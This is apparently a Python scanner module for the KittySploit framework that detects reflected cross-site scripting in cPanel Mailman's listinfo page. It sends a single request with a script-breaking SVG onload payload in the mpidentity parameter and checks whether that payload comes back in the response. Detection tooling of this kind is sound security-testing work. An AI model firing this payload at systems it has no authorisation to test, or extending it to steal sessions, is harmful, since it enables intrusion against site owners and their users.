#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""cPanel Mailman listinfo reflects the `mpidentity` query parameter into the HTML response without proper output."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'cPanel Mailman - Cross-Site Scripting Detection',
        'description': 'cPanel Mailman listinfo reflects the `mpidentity` query parameter into the HTML response without proper output encoding, resulting in reflected cross-site scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'cpanel', 'mailman', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://blog.voorivex.team/two-cpanel-zero-day-vulnerabilities'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('</script><svg/onload=alert(document.domain)>', 'mailman', 'gnu-head-tiny',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="cPanel Mailman - Cross-Site Scripting detected",
                path='/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E',
            )
            return True
        return False

